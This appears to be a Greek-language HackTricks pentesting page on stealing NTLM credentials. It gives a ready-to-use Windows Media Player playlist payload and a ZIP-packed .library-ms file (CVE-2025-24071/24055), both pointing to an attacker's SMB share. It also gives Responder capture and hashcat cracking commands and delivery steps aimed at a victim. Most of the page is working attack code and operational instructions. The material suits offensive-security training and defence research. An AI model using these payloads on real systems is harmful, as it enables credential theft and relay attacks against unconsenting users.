# Τοποθεσίες για να κλέψετε NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις εξαιρετικές ιδέες από [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — από το κατέβασμα ενός Microsoft Word αρχείου στο διαδίκτυο μέχρι την ntlm leaks πηγή: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Αν καταφέρετε να κάνετε έναν στόχο να ανοίξει ή να προεπισκοπήσει μια Windows Media Player playlist που ελέγχετε, μπορείτε να leak Net‑NTLMv2 δείχνοντας την εγγραφή σε ένα UNC path. Το WMP θα επιχειρήσει να ανακτήσει το αναφερόμενο media μέσω SMB και θα αυθεντικοποιήσει αυτόματα.

Παράδειγμα payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Ροή συλλογής και cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ενσωματωμένο .library-ms NTLM leak (CVE-2025-24071/24055)

Το Windows Explorer χειρίζεται ανασφαλώς αρχεία .library-ms όταν ανοίγονται απευθείας μέσα από ένα αρχείο ZIP. Εάν ο ορισμός της βιβλιοθήκης δείχνει σε απομακρυσμένο UNC path (π.χ., \\attacker\share), η απλή περιήγηση/εκτέλεση του .library-ms μέσα στο ZIP προκαλεί το Explorer να απαριθμήσει το UNC και να αποστείλει NTLM authentication στον attacker. Αυτό παράγει ένα NetNTLMv2 που μπορεί να σπαστεί offline ή ενδεχομένως να αναμεταφερθεί (relayed).

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Βήματα λειτουργίας
- Δημιουργήστε το αρχείο .library-ms με το XML παραπάνω (ορίστε το IP/hostname σας).
- Συμπιέστε το (στα Windows: Send to → Compressed (zipped) folder) και παραδώστε το ZIP στον στόχο.
- Εκτελέστε έναν NTLM capture listener και περιμένετε το θύμα να ανοίξει το .library-ms μέσα από το ZIP.


## Αναφορές
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
